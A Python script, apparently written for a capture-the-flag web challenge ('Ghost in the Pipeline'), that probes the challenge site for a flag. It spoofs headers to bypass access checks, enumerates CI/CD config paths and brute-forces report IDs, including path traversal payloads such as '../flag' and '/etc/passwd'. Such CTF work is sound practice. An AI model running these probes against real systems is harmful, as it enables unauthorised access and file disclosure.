#!/usr/bin/env python3
"""
Deep analysis of Ghost in the Pipeline
Focus on dashboard and report functionality
"""

import requests
import re
import json
from bs4 import BeautifulSoup

BASE_URL = "https://ghost-p.vishwactf.com"

def analyze_dashboard_detailed():
    """Detailed analysis of dashboard"""
    print("[*] Fetching dashboard...")
    
    try:
        r = requests.get(f"{BASE_URL}/dashboard", timeout=10)
        print(f"[+] Status: {r.status_code}")
        print(f"[+] Content-Length: {len(r.text)}")
        
        # Save full content
        with open("dashboard_full.html", "w", encoding="utf-8") as f:
            f.write(r.text)
        print("[+] Saved to dashboard_full.html")
        
        # Parse with BeautifulSoup
        soup = BeautifulSoup(r.text, 'html.parser')
        
        # Check for flag
        if "vishwaCTF{" in r.text:
            flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
            print(f"[!] FLAG FOUND: {flags}")
            return flags[0] if flags else None
        
        # Extract all text
        text = soup.get_text()
        print(f"\n[+] Dashboard text content:")
        print("="*60)
        print(text)
        print("="*60)
        
        # Look for forms
        forms = soup.find_all('form')
        print(f"\n[+] Found {len(forms)} forms")
        for i, form in enumerate(forms):
            print(f"\nForm {i+1}:")
            print(f"  Action: {form.get('action')}")
            print(f"  Method: {form.get('method')}")
            inputs = form.find_all('input')
            for inp in inputs:
                print(f"  Input: name={inp.get('name')}, type={inp.get('type')}, value={inp.get('value')}")
        
        # Look for scripts
        scripts = soup.find_all('script')
        print(f"\n[+] Found {len(scripts)} script tags")
        for i, script in enumerate(scripts):
            if script.string:
                print(f"\nScript {i+1}:")
                print(script.string[:500])
                
                if "vishwaCTF{" in script.string:
                    flags = re.findall(r'vishwaCTF\{[^}]+\}', script.string)
                    print(f"[!] FLAG IN SCRIPT: {flags}")
                    return flags[0] if flags else None
        
        # Look for data attributes
        elements_with_data = soup.find_all(attrs={"data-report-id": True})
        if elements_with_data:
            print(f"\n[+] Found elements with data-report-id:")
            for elem in elements_with_data:
                print(f"  {elem.name}: {elem.attrs}")
        
        # Look for any hidden content
        hidden = soup.find_all(style=re.compile(r'display:\s*none'))
        if hidden:
            print(f"\n[+] Found {len(hidden)} hidden elements")
            for elem in hidden:
                print(f"  {elem.get_text()[:100]}")
        
        return r.text
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()

def test_report_with_headers():
    """Test report API with different headers"""
    print("\n[*] Testing /api/report with various headers...")
    
    headers_to_try = [
        {},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Admin": "true"},
        {"X-Internal": "true"},
        {"Authorization": "Bearer test"},
        {"Content-Type": "application/json"},
        {"Referer": f"{BASE_URL}/dashboard"},
        {"Origin": BASE_URL},
    ]
    
    payload = {"message": "test report", "content": "test"}
    
    for headers in headers_to_try:
        try:
            r = requests.post(f"{BASE_URL}/api/report", json=payload, headers=headers, timeout=5)
            if r.status_code != 403:
                print(f"[+] Headers {headers}: Status {r.status_code}")
                print(f"    Response: {r.text[:200]}")
                
                if "vishwaCTF{" in r.text:
                    flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
                    print(f"[!] FLAG FOUND: {flags}")
                    return flags[0] if flags else None
        except Exception as e:
            print(f"[-] Error with {headers}: {e}")

def check_pipeline_endpoints():
    """Check for CI/CD pipeline related endpoints"""
    print("\n[*] Checking pipeline-related endpoints...")
    
    endpoints = [
        "/pipeline",
        "/ci",
        "/cd",
        "/jenkins",
        "/gitlab",
        "/github",
        "/actions",
        "/workflows",
        "/builds",
        "/deployments",
        "/staging",
        "/prod",
        "/production",
        "/.gitlab-ci.yml",
        "/.github/workflows/main.yml",
        "/Jenkinsfile",
        "/pipeline.yml",
        "/deploy.sh",
        "/build.sh",
    ]
    
    for endpoint in endpoints:
        try:
            r = requests.get(f"{BASE_URL}{endpoint}", timeout=5)
            if r.status_code in [200, 301, 302]:
                print(f"[+] {endpoint}: Status {r.status_code}")
                if r.status_code == 200:
                    print(f"    Preview: {r.text[:150]}")
                    
                    if "vishwaCTF{" in r.text:
                        flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
                        print(f"[!] FLAG FOUND: {flags}")
                        return flags[0] if flags else None
        except:
            pass

def check_with_report_ids():
    """Try accessing dashboard with various report IDs"""
    print("\n[*] Testing dashboard with report_id parameter...")
    
    # Try numeric IDs
    for i in range(0, 20):
        try:
            r = requests.get(f"{BASE_URL}/dashboard", params={"report_id": str(i)}, timeout=5)
            if "vishwaCTF{" in r.text:
                flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
                print(f"[!] FLAG FOUND with report_id={i}: {flags}")
                return flags[0] if flags else None
            
            # Check if response is different
            if i == 0:
                baseline_len = len(r.text)
            elif len(r.text) != baseline_len:
                print(f"[+] report_id={i}: Different response length ({len(r.text)} vs {baseline_len})")
                with open(f"dashboard_report_{i}.html", "w", encoding="utf-8") as f:
                    f.write(r.text)
                print(f"    Saved to dashboard_report_{i}.html")
        except:
            pass
    
    # Try special values
    special_ids = [
        "admin",
        "test",
        "flag",
        "secret",
        "../flag",
        "../../flag",
        "/etc/passwd",
        "flag.txt",
    ]
    
    for sid in special_ids:
        try:
            r = requests.get(f"{BASE_URL}/dashboard", params={"report_id": sid}, timeout=5)
            if "vishwaCTF{" in r.text:
                flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
                print(f"[!] FLAG FOUND with report_id={sid}: {flags}")
                return flags[0] if flags else None
        except:
            pass

def main():
    print("="*60)
    print("Deep Ghost in the Pipeline Analysis")
    print("="*60)
    
    # Analyze dashboard in detail
    analyze_dashboard_detailed()
    
    # Test report API with headers
    test_report_with_headers()
    
    # Check pipeline endpoints
    check_pipeline_endpoints()
    
    # Test report IDs
    check_with_report_ids()

if __name__ == "__main__":
    main()
